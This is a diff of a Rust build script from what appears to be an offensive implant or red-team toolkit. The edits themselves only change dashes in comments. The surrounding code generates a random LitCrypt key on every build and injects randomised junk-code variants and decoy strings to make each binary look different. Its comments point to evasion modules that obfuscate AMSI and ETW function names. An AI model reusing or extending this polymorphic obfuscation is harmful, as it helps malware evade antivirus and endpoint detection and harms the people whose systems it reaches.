@@ -12,7 +12,7 @@ fn main() {
     // ── 0. Force rebuild on every invocation ──────────────────────────
     //
     // Emitting no `cargo:rerun-if-changed` directives causes cargo to
-    // re-run build.rs on EVERY build — the documented default behaviour.
+    // re-run build.rs on EVERY build - the documented default behaviour.
     //
     // DO NOT add `cargo:rerun-if-changed=build.rs` here. That directive
     // means "re-run only when build.rs itself changes", which is the
@@ -30,7 +30,7 @@ fn main() {
     // ── 1. POLYMORPHISM: Random LitCrypt Key ──────────────────────────
     //
     // The key is 64 bytes drawn from the full printable-ASCII range
-    // (0x21–0x7E) rather than just alphanumerics. This expands the
+    // (0x21-0x7E) rather than just alphanumerics. This expands the
     // keyspace from 62^64 ≈ 2^381 to 94^64 ≈ 2^420 and avoids the
     // alphanumeric bias that makes brute-force enumeration marginally
     // cheaper.
@@ -38,7 +38,7 @@ fn main() {
     // NOTE: lc!() only obfuscates strings explicitly wrapped with the
     // macro. High-value WinAPI strings in the evasion modules
     // (amsi.dll, AmsiScanBuffer, ntdll.dll, EtwEventWrite, etc.) must
-    // be wrapped individually — build.rs cannot do that automatically.
+    // be wrapped individually - build.rs cannot do that automatically.
     // See the coverage audit in docs/evasion.md.
     let litcrypt_key: String = (0..64)
         .map(|_| rng.gen_range(0x21u8..=0x7Eu8) as char)
@@ -54,10 +54,10 @@ fn main() {
     // and altering basic-block sequences without changing semantics.
     //
     // The seed drives three independent decisions:
-    //   bits 0–15  : which junk function body variant is emitted
-    //   bits 16–31 : how many dead iterations the spin loop runs
-    //   bits 32–47 : which decoy error string variant is used
-    //   bits 48–63 : reserved for future variant selection
+    //   bits 0-15 : which junk function body variant is emitted
+    //   bits 16-31 : how many dead iterations the spin loop runs
+    //   bits 32-47 : which decoy error string variant is used
+    //   bits 48-63 : reserved for future variant selection
     let junk_seed: u64 = rng.gen();
     let junk_variant    = (junk_seed & 0xFFFF) % 4;           // 0-3
     let junk_iterations = 1 + ((junk_seed >> 16) & 0xFF);     // 1-256 (dead loops)
@@ -65,7 +65,7 @@ fn main() {
 
     let junk_body = match junk_variant {
         0 => format!(
-            // Variant 0: arithmetic spin — looks like a checksum or CRC stub
+            // Variant 0: arithmetic spin - looks like a checksum or CRC stub
             "    let mut _acc: u64 = {seed};\n\
              for _i in 0u64..{iters} {{ _acc = _acc.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407); }}\n\
              if _acc == 0 {{ std::process::exit(1); }}",
@@ -73,7 +73,7 @@ fn main() {
             iters = junk_iterations,
         ),
         1 => format!(
-            // Variant 1: byte array walk — looks like a hash or digest scan
+            // Variant 1: byte array walk - looks like a hash or digest scan
             "    let _buf: [u8; {sz}] = [0u8; {sz}];\n\
              let mut _sum: u32 = {seed_lo};\n\
              for b in _buf.iter() {{ _sum = _sum.wrapping_add(*b as u32).rotate_left(3); }}\n\
@@ -82,13 +82,13 @@ fn main() {
             seed_lo = (junk_seed & 0xFFFFFFFF) as u32,
         ),
         2 => format!(
-            // Variant 2: string length check — looks like an environment probe
+            // Variant 2: string length check - looks like an environment probe
             "    let _env_len: usize = option_env!(\"PATH\").map(|s| s.len()).unwrap_or({fallback});\n\
              if _env_len == 0 {{ std::process::exit(1); }}",
             fallback = 4 + (junk_iterations as usize % 12),
         ),
         _ => format!(
-            // Variant 3: bitfield test — looks like a capability or flag check
+            // Variant 3: bitfield test - looks like a capability or flag check
             "    let _flags: u64 = {flags}u64;\n\
              if _flags & (1 << {bit}) != 0 && _flags == 0 {{ std::process::exit(1); }}",
             flags = junk_seed ^ 0xDEADBEEFCAFEBABE,
